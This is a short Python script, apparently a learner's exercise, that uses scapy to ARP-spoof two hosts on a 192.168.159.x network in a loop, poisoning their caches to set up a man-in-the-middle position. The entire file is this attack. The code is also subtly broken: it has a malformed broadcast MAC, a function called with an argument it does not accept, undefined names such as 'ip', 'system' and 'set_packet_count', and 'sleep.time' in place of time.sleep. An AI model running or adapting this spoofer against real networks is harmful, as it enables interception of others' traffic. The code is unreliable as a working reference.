#!/usr/bin/env python

import scapy.all as scapy
import time 
import sys # import this library because he is solution working in python not 3

def get_mac(): 
    arp_request = scapy.ARP(pdst=ip) 
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff::ff") 
    arp_request_broadcast = broadcast/arp_request  
    answerd_list = scapy.srp(arp_request_broadcast,timeout=1, verbose=false)[0] 
    
    return answerd_list[0][1].hwsrc 
    
def spoof(target_ip, source_ip):
    target_mac = get_mac(target_ip) 
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip) 
    scapy.send(packet, verbose=False) 
try: ## this is run block of code and handling exception keyboards. 
    while True:   
       sent_packet_count = 0 
       spoof("192.168.159.1","192.168.159.2") 
       spoof("192.168.159.2","192.168.159.1") 
       sent_packet_count = set_packet_count + 2 
       print("\r[+] send the packet " + str(sent_packet_count)), # because this comma put here tell python not print the next line. ## /r using overwrite the strings and variables print the value single line. # this is working python 3.
       #print("\r[+] send the packet " + str(sent_packet_count), end="") #. use this end of python3 tell end="" nothing add the print.
       system.stdout.flush() ## this is flush the buffer. this is working python.
       sleep.time(2) 
except KeyboardInterrupt: # this is doing if you are enter ctrL + c
    print("you are press ctrl + c .....")   
 
    